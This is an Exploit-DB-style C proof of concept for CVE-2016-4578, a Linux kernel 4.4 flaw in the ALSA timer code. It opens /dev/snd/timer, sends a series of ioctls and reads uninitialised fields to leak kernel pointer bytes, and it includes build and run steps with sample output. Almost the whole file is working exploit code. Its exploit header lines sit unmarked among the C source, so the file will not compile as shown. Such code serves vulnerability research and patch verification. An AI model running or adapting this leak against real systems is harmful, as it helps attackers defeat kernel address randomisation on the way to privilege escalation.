#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sound/asound.h>

# Exploit Title: Linux Kernel 4.4 (Ubuntu 16.04) - Leak kernel pointer in snd_timer_user_ccallback()

# Google Dork: -

# Date: 2019-03-11

# Exploit Author: wally0813

# Vendor Homepage: -

# Software Link: -

# Version: Linux Kernel 4.4 (Ubuntu 16.04)

# Tested on: ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

# CVE: CVE-2016-4578

# Category: Local



/*
 * [ Briefs ]
 *    - If snd_timer_user_ccallback() doesn't initialize snd_timer_tread.event and snd_timer_tread.val, they are leaked by snd_timer_user_read()
 *    - This is local exploit against the CVE-2016-4578.
 *
 * [ Tested version ]
 *    - 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 *
 * [ Prerequisites ]
 *    -
 *
 * [ Goal ]
 *    - Leak 4 bytes kernel pointer address using snd_timer_user_ccallback()
 *
 * [ Run exploit ]
 *    - $ gcc -o poc poc.c
 *    - $ sudo ./poc
 *      leak_value(event) : ffff8800
 *      leak_value(val) : ffffffff
 *
 * [ Contact ]
 *    - soyeoni0813@gmail.com
 */



int fd;

void leak(){

	struct snd_timer_tread td;
	struct snd_timer_select st;
	struct snd_timer_params ps;
	int r;
	unsigned int leak_value_e, leak_value_v;
	int tread;

	memset(&td,0,sizeof(td));
	memset(&st,0,sizeof(st));
	memset(&ps,0,sizeof(ps));


	// set tread
	tread = 1;
	ps.filter |= 1<<SNDRV_TIMER_EVENT_START;
	ps.ticks = 1000 * 1000;

	r = ioctl(fd, SNDRV_TIMER_IOCTL_TREAD, &tread);
	if (r) {
		printf("SNDRV_TIMER_IOCTL_TREAD error : %d, %s\n", errno, strerror(errno));
		return;
	}


	// vuln trigger
	st.id.dev_class = SNDRV_TIMER_CLASS_GLOBAL;
	st.id.dev_sclass = SNDRV_TIMER_SCLASS_APPLICATION;
	r = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, &st);
	if (r) {
		printf("SNDRV_TIMER_IOCTL_SELECT error : %d, %s\n", errno, strerror(errno));
		return;
	}

	r = ioctl(fd, SNDRV_TIMER_IOCTL_PARAMS, &ps);
	if (r) {
		printf("SNDRV_TIMER_IOCTL_PARAMS error : %d, %s\n", errno, strerror(errno));
		return;
	}

	r = ioctl(fd, SNDRV_TIMER_IOCTL_START);
    if (r) {
    	printf("SNDRV_TIMER_IOCTL_START error : %d, %s\n", errno, strerror(errno));
    	return;
	}


    // get leak
	r = read(fd, &td, sizeof(td));

	leak_value_e = *((unsigned long *)(&td.event+1));
	printf("leak_value(event) : %lx\n", leak_value_e);

	leak_value_v = *((unsigned long *)(&td.val+1));
	printf("leak_value(val) : %lx\n", leak_value_v);

}

int main(int argc, char **argv)
{
	fd = open("/dev/snd/timer", O_RDWR);

	if (fd < 0) {
		printf("open error : %d, %s\n", errno, strerror(errno));
		return -1;
	}

	leak();
	close(fd);
	return 0;
}